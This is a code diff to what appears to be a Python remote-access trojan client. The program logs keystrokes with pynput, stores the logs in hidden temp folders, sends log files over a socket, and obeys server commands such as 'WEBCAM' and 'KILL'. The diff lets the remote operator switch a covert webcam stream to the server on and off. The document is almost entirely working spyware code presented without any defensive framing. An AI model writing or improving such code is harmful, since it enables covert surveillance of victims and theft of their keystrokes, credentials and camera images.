@@ -19,9 +19,9 @@ from pynput.keyboard import Listener
 
 # Global variables
 stop = False
+webcam_thread = None
 LOG_DIR_WINDOWS = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'logs')
 LOG_DIR_LINUX = '/tmp/logs'
-
 
 # Function to get the OS
 def get_os():
@@ -94,10 +94,10 @@ def send_log_message(sock, filename):
 
 
 # Function to capture and send webcam image
-def capture_and_send_webcam(sock):
+def capture_and_send_webcam(sock, stop_signal):
     cap = cv2.VideoCapture(0)
 
-    while True:
+    while not stop_signal.is_set():
         ret, frame = cap.read()
         if not ret:
             break
@@ -123,6 +123,8 @@ def capture_and_send_webcam(sock):
 
 # Function to receive commands from server
 def receive_commands(sock):
+    global webcam_thread
+    stop_cam_signal = threading.Event()
     try:
         while True:
             data = sock.recv(1024)
@@ -179,8 +181,12 @@ def receive_commands(sock):
                     sock.send(json_data.encode())
 
                 elif command_type == 'WEBCAM':
-                    webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock,))
-                    webcam_thread.start()
+                    if webcam_thread is None or not webcam_thread.is_alive():
+                        stop_cam_signal.clear()
+                        webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock, stop_cam_signal))
+                        webcam_thread.start()
+                    else:
+                        stop_cam_signal.set()
 
                 elif command_type == 'KILL':
                     global stop
